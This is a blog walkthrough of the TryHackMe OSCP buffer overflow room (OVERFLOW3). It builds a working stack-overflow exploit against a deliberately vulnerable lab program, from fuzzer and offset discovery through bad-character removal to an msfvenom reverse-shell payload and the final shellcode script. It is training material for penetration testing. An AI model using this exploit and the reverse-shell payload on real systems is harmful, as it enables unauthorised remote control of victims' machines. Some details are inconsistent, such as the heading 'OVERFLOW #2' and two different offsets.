::: {}
# TryHackMe: OSCP Buffer Overflow Prep (OVERFLOW 3) {#tryhackme-oscp-buffer-overflow-prep-overflow-3 .p-name}
:::

::: {.section .p-summary field="subtitle"}
Practice Stack Based Buffer Overflows! for OSCP
:::

:::::::: {.section .e-content field="body"}
::::::: {#0ae9 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

::::: section-content
:::: {.section-inner .sectionLayout--insetColumn}
### TryHackMe: OSCP Buffer Overflow Prep (OVERFLOW 3) {#dfde .graf .graf--h3 .graf--leading .graf--title name="dfde"}

<figure id="d4b1" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/1*qEulFAq58mWGhZDW9Ic6kQ.png"
class="graf-image" data-image-id="1*qEulFAq58mWGhZDW9Ic6kQ.png"
data-width="2240" data-height="1260" data-is-featured="true" />
</figure>

**Practice Stack Based Buffer Overflows! for OSCP**

**Room link:**
[**https://www.tryhackme.com/room/bufferoverflowprep**](https://www.tryhackme.com/room/bufferoverflowprep){.markup--anchor
.markup--p-anchor
data-href="https://www.tryhackme.com/room/bufferoverflowprep"
rel="noopener ugc nofollow noopener" target="_blank"}

### Definitions: {#552b .graf .graf--h3 .graf-after--p name="552b"}

1.  [**EIP =\>**The Extended Instruction Pointer (EIP) is a register
    that contains the address of the next instruction for the program or
    command.]{#631b}
2.  [**ESP=\>**The Extended Stack Pointer (ESP) is a register that lets
    you know where on the stack you are and allows you to push data in
    and out of the application.]{#1c95}
3.  [**JMP =\>**The Jump (JMP) is an instruction that modifies the flow
    of execution where the operand you designate will contain the
    address being jumped to.]{#8471}
4.  [**\\x41, \\x42, \\x43 =\>**The hexadecimal values for A, B and C.
    For this exercise, there is no benefit to using hex vs ascii, it's
    just my personal preference.]{#141d}

### OVERFLOW #2 {#91df .graf .graf--h3 .graf-after--li name="91df"}

Okay, right now we should run our Immunity Debugger as Administrator and
open the oscp.exe.

<figure id="ac5c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*P15-9n3P0sWu7_M0.png"
class="graf-image" data-image-id="0*P15-9n3P0sWu7_M0.png"
data-width="653" data-height="391" />
</figure>

The application will be loaded into the debugger in the "Paused" state.
click Red play button on the upper bar **OR F9** within Immunity
Debugger.

Ensure the exe is running by checking the status in the lower right of
Immunity Debugger.

<figure id="e174" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*0MsDgio7qb8KUuBc.png"
class="graf-image" data-image-id="0*0MsDgio7qb8KUuBc.png"
data-width="310" data-height="215" />
</figure>

To check we can NC to target machine with port 1337.

<figure id="57ed" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*KMMdPg23BrpwdAcL.png"
class="graf-image" data-image-id="0*KMMdPg23BrpwdAcL.png"
data-width="526" data-height="437" />
</figure>

Here i am choosing **OVERFLOW3** Parameter

Set the working folder within mona.

::: {#5647 .graf .graf--mixtapeEmbed .graf-after--p}
[**GitHub - corelan/mona: Corelan Repository for mona.py**\
*Corelan Repository for mona.py. Contribute to corelan/mona development
by creating an account on
GitHub.*github.com](https://github.com/corelan/mona?source=post_page-----fdece5d96532-------------------------------- "https://github.com/corelan/mona?source=post_page-----fdece5d96532--------------------------------"){.markup--anchor
.markup--mixtapeEmbed-anchor
data-href="https://github.com/corelan/mona?source=post_page-----fdece5d96532--------------------------------"}[](https://github.com/corelan/mona?source=post_page-----fdece5d96532--------------------------------){.js-mixtapeImage
.mixtapeImage .u-ignoreBlock media-id="38b17928043b7b0e51ee24c89d74beb1"
thumbnail-img-id="0*_z_SyjncKR859Dr2"
style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*_z_SyjncKR859Dr2);"}
:::

Download mona.py and paset into C:\\Program Files (x86)\\Immunity
Inc\\Immunity Debugger\\PyCommands

``` {#c17b .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
!mona config -set workingfolder c:\mona\%p
```

<figure id="9ba2" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*SlhgOVm98VucWRfE.png"
class="graf-image" data-image-id="0*SlhgOVm98VucWRfE.png"
data-width="419" data-height="185" />
</figure>

Let's try to run fuzzer.py (get from the room) and see the results. Just
check whether the IP inside the script is correct and make sure to run
again the oscp.exe in Immunity Debugger before running the script.

**Note:- change the Command OVERFLOW2 to OVERFLOW3 in fuzzer.py and
exploit.py**

### Fuzzer.py {#c8c5 .graf .graf--h3 .graf-after--p name="c8c5"}

``` {#2d53 .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="lua"}
import socket, time, sysip = "192.168.43.57";
port = 1337
timeout = 5buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW3 " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

Also copy the **exploit.py** code

``` {#c966 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="makefile"}
import socketip = "192.168.43.57"
port = 1337prefix = "OVERFLOW3 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""buffer = prefix + overflow + retn + padding + payload + postfixs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Click on Red play button , and Kick off the fuzzer.py against the target
IP

<figure id="336e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Xj6LE0w2LRRusQat.png"
class="graf-image" data-image-id="0*Xj6LE0w2LRRusQat.png"
data-width="393" data-height="325" />
</figure>

If you can see it stop at 1300 bytes which means the offset would be in
the range of 1200 to 1300 bytes. Let's create a pattern more than our
offset around 100 bytes which would be 1400 bytes.

<figure id="f883" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ofgB9Nw3n9KeY9B2.png"
class="graf-image" data-image-id="0*ofgB9Nw3n9KeY9B2.png"
data-width="676" data-height="301" />
</figure>

Above image you can see that EIP has been overwritten with 41414141
(AAAA). So we need to find the exact address where the program is
crashed

Now generate a pattern, based on the length of bytes to crash the
server.

``` {#70cb .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
msf-pattern_create -l 1400
```

<figure id="9827" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*BndYn3nbGVKjtvko.png"
class="graf-image" data-image-id="0*BndYn3nbGVKjtvko.png"
data-width="818" data-height="360" />
</figure>

So copy the payload and put it into the payload variable in exploit.py
and try to run it. The script should crash the oscp.exe server again.

**CTRL+F2 = Reload OSCP.exe**

**F9 = Run Server**

<figure id="d31c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*urRGNQuJyPsNaU82.png"
class="graf-image" data-image-id="0*urRGNQuJyPsNaU82.png"
data-width="807" data-height="392" />
</figure>

Ensure oscp.exe is running within Immunity Debugger. Execute exploit.py
against the target.

<figure id="4d06" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*2DZw_ED3Yx0l6Z0j.png"
class="graf-image" data-image-id="0*2DZw_ED3Yx0l6Z0j.png"
data-width="417" data-height="98" />
</figure>

<figure id="445d" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*7e4gxPpf3ll0I2-O.png"
class="graf-image" data-image-id="0*7e4gxPpf3ll0I2-O.png"
data-width="672" data-height="308" />
</figure>

in the above image We have **EIP=35714234**

EIP is overwritten by an offset that we generated.

### Find Offset Value {#be2a .graf .graf--h3 .graf-after--p name="be2a"}

<figure id="4450" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*Cmos5WwPqRvKUWMo.png"
class="graf-image" data-image-id="0*Cmos5WwPqRvKUWMo.png"
data-width="429" data-height="74" />
</figure>

offset value is 1274

**Another Method** to find Offset value using mona module

Try running the following mona command in immunity:

``` {#761f .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
!mona findmsp -distance 1600
```

<figure id="2aa0" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*s4ydxumMac42YvxC.png"
class="graf-image" data-image-id="0*s4ydxumMac42YvxC.png"
data-width="762" data-height="422" />
</figure>

So look for the line said EIP contains normal pattern :0x76413176
(offset 634). the offset we found in the offset variable and set the
retn variable to BBBB.

Update the offset and the retn variable

<figure id="6faf" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*xaAPYFWckdiXeIuz.png"
class="graf-image" data-image-id="0*xaAPYFWckdiXeIuz.png"
data-width="807" data-height="332" />
</figure>

Restart the .exe in Immunity Debugger with Ctrl+F12 and F9 to run.
Execute the exploit.py. If the offset is correct we should see
"42424242" \<- the B's at the EIP.

Let's run it again.

<figure id="a0a3" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*2A9OMgucn8IBVyv-.png"
class="graf-image" data-image-id="0*2A9OMgucn8IBVyv-.png"
data-width="417" data-height="98" />
</figure>

<figure id="3f06" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*i_e0R-Jfs40a_yZY.png"
class="graf-image" data-image-id="0*i_e0R-Jfs40a_yZY.png"
data-width="672" data-height="302" />
</figure>

As we can see the **EIP** Register is Overwritten with BBBB or 42424242.
So far everything went well.

Take note of the ESP address because we will be using the values in this
position in future step

### Find Badchars {#78d2 .graf .graf--h3 .graf-after--p name="78d2"}

Now we need to find the BADCHARS- For which we create BADCHARS, on set
inside the machine using MONA and another by just googling or using a
python script.By default \\x00 is considered as a BADCHAR so it is to be
neglected for sure. This helps us to identify the characters which are
really BAD for our program!

Generate a bytearray using mona, and exclude the null byte (\\x00) by
default.

Use this mona commands.

``` {#a275 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona bytearray -b "\x00"
```

<figure id="72fb" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*Jflsm9BJMRTWE_LP.png"
class="graf-image" data-image-id="0*Jflsm9BJMRTWE_LP.png"
data-width="1366" data-height="386" />
</figure>

Now we need to generate a string of bad chars from \\x01 to \\xff that
is identical to the bytearray. Use the python script

### bytegen.py {#cf09 .graf .graf--h3 .graf-after--p name="cf09"}

``` {#c444 .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="scss"}
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

<figure id="f9a4" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*n8MmCk3sSHOwispb.png"
class="graf-image" data-image-id="0*n8MmCk3sSHOwispb.png"
data-width="815" data-height="289" />
</figure>

This generated string has already removed the \\x00 so we need to remove
that from the .bin with mona.

Copy the new generated string into the payload variable in the
exploit.py

<figure id="dd63" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*BcjR3P5QRFUxc07d.png"
class="graf-image" data-image-id="0*BcjR3P5QRFUxc07d.png"
data-width="817" data-height="353" />
</figure>

Run the script and take note of the address to which the ESP register
points

<figure id="d7b9" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*IlVVumWs4XU66fCq.png"
class="graf-image" data-image-id="0*IlVVumWs4XU66fCq.png"
data-width="406" data-height="96" />
</figure>

<figure id="36fa" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*2QAVwa__b1B6mH6r.png"
class="graf-image" data-image-id="0*2QAVwa__b1B6mH6r.png"
data-width="670" data-height="310" />
</figure>

Right click on ESP Value and Follow in dump

<figure id="7716" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*OkP2xpy6tiIgcnS-.png"
class="graf-image" data-image-id="0*OkP2xpy6tiIgcnS-.png"
data-width="383" data-height="389" />
</figure>

in the above image the sequence has been changed between 10 or 13 that
means there are some badchar in over payload lets find out badchars

Use it in the following mona command

**Note:-** Maybe your ESP address is diffrent

``` {#ce6b .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona compare -f C:\mona\oscp\bytearray.bin -a 00D0FA28
```

<figure id="8e81" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*PZW2iHpTwKjoIph_.png"
class="graf-image" data-image-id="0*PZW2iHpTwKjoIph_.png"
data-width="1234" data-height="357" />
</figure>

Possible bad chars

So we found a list of possible bad chars
**`11 12 40 41 5f 60 b8 b9 ee ef`{.markup--code .markup--p-code}**

Not all of these might be bad chars! Sometimes bad chars cause the next
byte to get corrupted as well, or even affect the rest of the string.

At this point I start removing the bad characters one at a time. I
removed one bad character at a time by repeating the following steps:

- [Remove character from byte array]{#6711}
- [Remove character from exploit payload]{#d6d4}
- [Start exe]{#6641}
- [Compare using mona]{#a713}

Start oscp.exe in immunity,

So i created a new bytearray and removed \\x11 from the payload too

``` {#566e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona bytearray -b "\x00\x11"
```

<figure id="08c4" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*4MXJkrV1qfvGhQuK.png"
class="graf-image" data-image-id="0*4MXJkrV1qfvGhQuK.png"
data-width="668" data-height="369" />
</figure>

run server

Edit exploit.py remove \\x11 from payload variable and run exploit.py

<figure id="6879" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*TC2b_XPNUpgITonk.png"
class="graf-image" data-image-id="0*TC2b_XPNUpgITonk.png"
data-width="406" data-height="96" />
</figure>

check ESP Pointer value

<figure id="4f44" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*CZr66l1zNnIoyzh2.png"
class="graf-image" data-image-id="0*CZr66l1zNnIoyzh2.png"
data-width="668" data-height="346" />
</figure>

``` {#d5fe .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona compare -f C:\mona\oscp\bytearray.bin -a 00D5FA28(ESP)
```

<figure id="ea50" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*ozR5b0lx7PlXEt6q.png"
class="graf-image" data-image-id="0*ozR5b0lx7PlXEt6q.png"
data-width="630" data-height="326" />
</figure>

As a hint by the immunity debugger the possible BADCHARS now were x40
\\x41\\x5f \\x60\\xb8\\xb9\\xee\\xef. That means a BADCHAR made its
adjacent byte too a BADCHAR which want BAD by default

start oscp.exe in immunity

So i created a new bytearray and removed \\x40 from the payload too

``` {#6aae .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona bytearray -b "\x00\x11\x40"
```

run server

Edit exploit.py remove \\x40 from payload variable and run exploit.py

<figure id="b427" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*B5z8hrJXi8rEFfNZ.png"
class="graf-image" data-image-id="0*B5z8hrJXi8rEFfNZ.png"
data-width="406" data-height="96" />
</figure>

check ESP Pointer value

<figure id="bc96" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*TDOZKpaLPPlT7b1f.png"
class="graf-image" data-image-id="0*TDOZKpaLPPlT7b1f.png"
data-width="673" data-height="345" />
</figure>

``` {#eaff .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona compare -f C:\mona\oscp\bytearray.bin -a 0088FA28
```

<figure id="bb52" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*TDeYRLaf_UPvTHFJ.png"
class="graf-image" data-image-id="0*TDeYRLaf_UPvTHFJ.png"
data-width="640" data-height="290" />
</figure>

and again it was the same case x40 was a BADCHAR was x41 wasn't one.

Now we had only two apparent BADCHARS \\x5f \\x60\\xb8\\xb9\\xee\\xef

start oscp.exe in immunity

So i created a new bytearray and removed \\x5f from the payload too

``` {#5485 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona bytearray -b "\x00\x11\x40\x5f"
```

run server

Edit exploit.py remove \\x5f from payload variable and run exploit.py

<figure id="f60a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*rpZTB1vTh54yULF_.png"
class="graf-image" data-image-id="0*rpZTB1vTh54yULF_.png"
data-width="406" data-height="96" />
</figure>

check ESP Pointer value

<figure id="89e5" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Doe9mgu3sMfqOwo_.png"
class="graf-image" data-image-id="0*Doe9mgu3sMfqOwo_.png"
data-width="673" data-height="347" />
</figure>

``` {#403d .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona compare -f C:\mona\oscp\bytearray.bin -a 00BDFA28
```

<figure id="cb34" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*a0AXGYpbUprHdF5U.png"
class="graf-image" data-image-id="0*a0AXGYpbUprHdF5U.png"
data-width="606" data-height="272" />
</figure>

and again it was the same case x5f was a BADCHAR was x60 wasn't one.

Now we had only two apparent BADCHARS \\xb8\\xb9\\xee\\xef

start oscp.exe in immunity

So i created a new bytearray and removed \\xb8 from the payload too

``` {#b05a .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona bytearray -b "\x00\x11\x40\x5f\xb8"
```

run server

Edit exploit.py remove \\xb8 from payload variable and run exploit.py

<figure id="3df1" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*WEVZbfpvJ8KC1GkS.png"
class="graf-image" data-image-id="0*WEVZbfpvJ8KC1GkS.png"
data-width="406" data-height="96" />
</figure>

check ESP Pointer value

<figure id="3702" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*CMCmrN226wwbnBxs.png"
class="graf-image" data-image-id="0*CMCmrN226wwbnBxs.png"
data-width="674" data-height="349" />
</figure>

``` {#3000 .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona compare -f C:\mona\oscp\bytearray.bin -a 008DFA28
```

<figure id="dc3f" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*DHZFALz75TD4sndz.png"
class="graf-image" data-image-id="0*DHZFALz75TD4sndz.png"
data-width="595" data-height="243" />
</figure>

and again it was the same case xb8 was a BADCHAR was xb9 wasn't one.

Now we had only two apparent BADCHARS \\xee\\xef

start oscp.exe in immunity

So i created a new bytearray and removed \\xee from the payload too

``` {#45d7 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona bytearray -b "\x00\x11\x40\x5f\xb8\xee"
```

run server

Edit exploit.py remove \\xee from payload variable and run exploit.py

<figure id="f640" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*fct323tcJnmU21ez.png"
class="graf-image" data-image-id="0*fct323tcJnmU21ez.png"
data-width="406" data-height="96" />
</figure>

check ESP Pointer value

<figure id="53d6" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*p_Sr0cYLRde1VN7v.png"
class="graf-image" data-image-id="0*p_Sr0cYLRde1VN7v.png"
data-width="670" data-height="354" />
</figure>

``` {#b204 .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona compare -f C:\mona\oscp\bytearray.bin -a 0085FA28
```

<figure id="6318" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*5Vf4q4TGh6ZUKiPv.png"
class="graf-image" data-image-id="0*5Vf4q4TGh6ZUKiPv.png"
data-width="1250" data-height="355" />
</figure>

After this! WE FIRE IT and run the comparison in MONA, we find the
address unmodified now. BOOM so finally we got our BADCHARS

got error unmodified, And after try and error, the sequence is like
this.

Green Box means correct bad chars, Let's find the jump point using the
mona command again:

``` {#907a .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="diff"}
!mona jmp -r esp -cpb “\x00\x11\x40\x5f\xb8\xee”
```

<figure id="42a7" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*uu5Aj1oYI_TeXsGX.png"
class="graf-image" data-image-id="0*uu5Aj1oYI_TeXsGX.png"
data-width="700" data-height="180" />
</figure>

Any of the addresses from the results above may be used as the retn
value in the exploit. Little endian = Reverse. Also add padding to allow
the payload to unpack.

Note the address **62501203**

> ***Note:- If 62501203 not create perfect paylaod for for reverse shell
> then change address untill you got reverse shell***

Update our retn variable with the new address and must be written
backward (since the system is little-endian=Reverse).

``` {#b2c3 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="ini"}
retn = "\x03\x12\x50\x62"
padding = "\x90" * 16
```

<figure id="a7c5" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*Mg0jhTOeNtsoikl_.png"
class="graf-image" data-image-id="0*Mg0jhTOeNtsoikl_.png"
data-width="498" data-height="200" />
</figure>

Now generate the reverse shell payload using msfvenom.

``` {#1fcd .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.73 LPORT=4444 EXITFUNC=thread -b “\x00\x11\x40\x5f\xb8\xee” -f c
```

<figure id="b033" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*GptBptN0qKI71MRY.png"
class="graf-image" data-image-id="0*GptBptN0qKI71MRY.png"
data-width="847" data-height="610" />
</figure>

Copy the payload into the exploit.py and set the payload variable equal
to buf.

<figure id="5d2a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*IUo2Tgno234n70bv.png"
class="graf-image" data-image-id="0*IUo2Tgno234n70bv.png"
data-width="1235" data-height="625" />
</figure>

so the final payload is this for My Kali

``` {#533e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="makefile"}
import socketip = "192.168.43.57"
port = 1337
buf = b""
buf += b"\xfc\xbb\xc3\x62\xa9\xe4\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
buf += b"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x3f\x8a\x2b\xe4\xbf"
buf += b"\x4b\x4c\x6c\x5a\x7a\x4c\x0a\x2f\x2d\x7c\x58\x7d\xc2\xf7\x0c"
buf += b"\x95\x51\x75\x99\x9a\xd2\x30\xff\x95\xe3\x69\xc3\xb4\x67\x70"
buf += b"\x10\x16\x59\xbb\x65\x57\x9e\xa6\x84\x05\x77\xac\x3b\xb9\xfc"
buf += b"\xf8\x87\x32\x4e\xec\x8f\xa7\x07\x0f\xa1\x76\x13\x56\x61\x79"
buf += b"\xf0\xe2\x28\x61\x15\xce\xe3\x1a\xed\xa4\xf5\xca\x3f\x44\x59"
buf += b"\x33\xf0\xb7\xa3\x74\x37\x28\xd6\x8c\x4b\xd5\xe1\x4b\x31\x01"
buf += b"\x67\x4f\x91\xc2\xdf\xab\x23\x06\xb9\x38\x2f\xe3\xcd\x66\x2c"
buf += b"\xf2\x02\x1d\x48\x7f\xa5\xf1\xd8\x3b\x82\xd5\x81\x98\xab\x4c"
buf += b"\x6c\x4e\xd3\x8e\xcf\x2f\x71\xc5\xe2\x24\x08\x84\x6a\x88\x21"
buf += b"\x36\x6b\x86\x32\x45\x59\x09\xe9\xc1\xd1\xc2\x37\x16\x15\xf9"
buf += b"\x80\x88\xe8\x02\xf1\x81\x2e\x56\xa1\xb9\x87\xd7\x2a\x39\x27"
buf += b"\x02\xfc\x69\x87\xfd\xbd\xd9\x67\xae\x55\x33\x68\x91\x46\x3c"
buf += b"\xa2\xba\xed\xc7\x25\x05\x59\xec\xfc\xed\x98\xf2\xef\xb1\x15"
buf += b"\x14\x65\x5a\x70\x8f\x12\xc3\xd9\x5b\x82\x0c\xf4\x26\x84\x87"
buf += b"\xfb\xd7\x4b\x60\x71\xcb\x3c\x80\xcc\xb1\xeb\x9f\xfa\xdd\x70"
buf += b"\x0d\x61\x1d\xfe\x2e\x3e\x4a\x57\x80\x37\x1e\x45\xbb\xe1\x3c"
buf += b"\x94\x5d\xc9\x84\x43\x9e\xd4\x05\x01\x9a\xf2\x15\xdf\x23\xbf"
buf += b"\x41\x8f\x75\x69\x3f\x69\x2c\xdb\xe9\x23\x83\xb5\x7d\xb5\xef"
buf += b"\x05\xfb\xba\x25\xf0\xe3\x0b\x90\x45\x1c\xa3\x74\x42\x65\xd9"
buf += b"\xe4\xad\xbc\x59\x04\x4c\x14\x94\xad\xc9\xfd\x15\xb0\xe9\x28"
buf += b"\x59\xcd\x69\xd8\x22\x2a\x71\xa9\x27\x76\x35\x42\x5a\xe7\xd0"
buf += b"\x64\xc9\x08\xf1\x64\xed\xf6\xfa"
prefix = "OVERFLOW3 "
offset = 1274
overflow = "A" * offset
retn = "\x03\x12\x50\x62"
padding = "\x90" * 16
payload = bufpostfix = ""buffer = prefix + overflow + retn + padding + payload + postfixs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(buffer + "\r\n")
  print("Done!")
except:
  print("Could not connect.")
```

Start up a listener with netcat

<figure id="e893" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*-5NxfIHtdwZ-JW7_.png"
class="graf-image" data-image-id="0*-5NxfIHtdwZ-JW7_.png"
data-width="333" data-height="101" />
</figure>

Start the vulnerable application again. Execute exploit.py. Now looking
back at netcat.

<figure id="8d7c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*429rwH8Q8IQvo5Rn.png"
class="graf-image" data-image-id="0*429rwH8Q8IQvo5Rn.png"
data-width="406" data-height="96" />
</figure>

<figure id="2755" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*qRMmBnwi3a9-LIxQ.png"
class="graf-image" data-image-id="0*qRMmBnwi3a9-LIxQ.png"
data-width="657" data-height="246" />
</figure>

### Promote and Collaborate on Cybersecurity Insights {#5e34 .graf .graf--h3 .graf-after--figure name="5e34"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#8803 .graf .graf--h3 .graf-after--p name="8803"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
::::
:::::
:::::::
::::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 15, 2024](https://medium.com/p/6b2de5707041).

[Canonical
link](https://medium.com/@bevijaygupta/tryhackme-oscp-buffer-overflow-prep-overflow-3-6b2de5707041){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
